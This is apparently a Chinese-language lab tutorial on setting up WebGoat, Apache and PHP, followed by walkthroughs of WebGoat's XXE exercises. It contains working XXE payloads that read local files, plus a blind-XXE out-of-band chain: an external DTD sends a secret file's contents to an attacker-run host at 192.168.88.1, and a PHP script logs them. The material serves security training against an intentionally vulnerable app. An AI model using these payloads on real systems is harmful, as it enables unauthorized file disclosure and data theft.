# WebGoat 搭建  
1. 
安装docker,使用以下命令  
```bash
docker run -it -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 webgoat/webgoat
```  


2. 
https://github.com/WebGoat/WebGoat/releases/download/v2025.3/webgoat-2025.3.jar  


3. 使用源码搭建  

- 下载源码  
```
git clone https://github.com/WebGoat/WebGoat.git
``` 
进入，在当前目录打开pom.xml文件，找到java.version标签，把java版本修改为自己的java版本。 使用管理员权限，执行  
```bash
./mvnw.cmd clean install
```  
~/.m2/repository/org/eclipse/jgit/org.eclipse.jgit
cd ~/.m2/repository/org/apache/pdfbox/pdfbox/2.0.24  

# php和Apache httpd  
httpd下载连接  
```
https://www.apachelounge.com/download/ 
```  
解压缩之后有一个叫Apache24的文件夹，如果移动到其他地方，需要自己修改配置，如果直接放在C盘，就不需要再修改配置。  
配置文件是Apache24/config/httpd.conf,找到图中内容，把路径修改为自己的路径  
在Apache24/bin目录双击运行ApacheMoniter.exe  
![alt text](image.png)  
![alt text](image-1.png)  
如果没有打开，左键单击图标可以开启  
![alt text](image-2.png)
如果左键没有反应，右键单击，打开open servers,看到Apache2.4,就开启他  

启动成功后访问localhost，页面应该和Apache24/htdocs/index.html一样  
![alt text](image-3.png)  

php下载连接 
```
https://www.php.net/downloads.php  
```
选择一个版本，点击Windows downloads，
![alt text](image-4.png)  

有很多，比如这里有两个，上面是Non Thread Safe,下面是Thread Safe,下载Thread Safe的，解压之后放好  

打开Apache24/conf/httpd.conf文件，在合适的地方添加下面内容，文件内有很多标签，不要加在标签内部就可以了。文件路径该为自己php的路径。  
```
LoadModule php_module 'C:/server/php8.4.5/php8apache2_4.dll'
PHPIniDir 'C:/server/php8.4.5'
AddType application/x-httpd-php .php
```

在Apache24/htdocs/下添加一个hello.php文件，填写下面内容  
```php
<?php

echo "hello";
```  
然后重启httpd
![alt text](image-2.png)  
访问localhost/hello.php  
下面是成功的情况  
![alt text](image-5.png)  
如果没有配置好，可能是下面的样子  
![alt text](image-6.png)  

# XXE  
XXE（XML外部实体注入）是一种针对应用程序处理XML数据的方式的攻击。在这种攻击中，攻击者利用应用程序对XML输入的处理不当，访问敏感数据。  

## XML  
XML 是可扩展标记语言（Extensible Markup Language），是一种标签语言，用来传输和存储数据。必须使用树形结构。  
DTD用于定义XML文档的结构、元素、属性、实体等合法组成规则。  
XML实体在DTD中被声明，用于代替内容或标记。  

## 一个XXE的简单例子  
![alt text](image-7.png)  
要求找到根目录下的内容有什么  

先提交一个评论，抓包  
![alt text](image-8.png)  
可以发现请求体使用xml格式，再次发送拦截，并且修改请求体为以下内容  
```xml
<?xml version="1.0"?>
<!DOCTYPE comment [
<!ENTITY root SYSTEM "file:///">
]>
<comment>
<text>&root;</text>
</comment>
```  
提交之后发现评论区出现了根目录的内容  
![alt text](image-9.png)  

第七页，因为现代REST框架，服务器可能会处理开发者没有考虑的情况，这里请求体使用json格式，但是服务端仍然可以处理xml格式的信息，所以conten-type之后采用同样的方式攻击  
修改两处，一个是Content-Type，修改成如图内容，一个是修改请求体，修改内容和上一题一样  


## blind xxe  

服务端可能设置一些过滤规则，或者由于某些特殊字符导致返回结果不可见。以一个题为例  

任务是找出/home/webgoat/.webgoat-2023.8//XXE/webgoat/secret.txt的内容  
![alt text](image-10.png)  

首先发个请求抓包  
![alt text](image-11.png)
按照xxe的思路，将请求体修改为一下内容发送，评论区将显示想要的结果  
```xml
<?xml version="1.0"?>
<!DOCTYPE comment[
<!ENTITY secret SYSTEM "file:///home/webgoat/.webgoat-2023.8//XXE/webgoat/secret.txt">
]>
<comment>
<text>&secret;</text>
</comment>
```
但是返回结果并不是想要的内容，这是因为服务端检查到特殊的内容后，会将原本预期的内容修改  
![alt text](image-12.png)  

可以使用外带数据的方式实现xxe攻击  

外带数据一般是将目标内容作为get请求的参数添加到url路径后面，查看请求得到url，以本题为例  

首先需要一个目标主机能访问到的服务，攻击者能查看这个服务的请求信息  
这里可以使用Apache搭建一个服务  
比如使用Apache2.4,在Apache24/htdocs下新建一个get.php文件，内容如下  
```php
<?php

echo "This is very good!","</br>";
$file = fopen("test.txt","w");
foreach ($_GET as $key => $val){
    echo $key," ",$val,"</br>";
    fwrite($file,$val);
    fwrite($file,"\n");
}

fclose($file);
```  
当目标主机访问这个页面时，get请求的参数值会保存到test.txt文件中  

建立一个kk.txt,内容如下  
```xml
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://192.168.88.1/get.php?a=%secret;'>">
```  

发评论，抓包，修改请求体如下  
```xml  
<?xml version="1.0"?>
<!DOCTYPE comment[
<!ENTITY % secret SYSTEM "file:///home/webgoat/.webgoat-2023.8//XXE/webgoat/secret.txt">
<!ENTITY % out SYSTEM "http://192.168.88.1/kk.txt">
%out;%int;%send;
]>
<comment>
<text>hello</text>
</comment>
```  
查看test.txt,保存了目标内容  
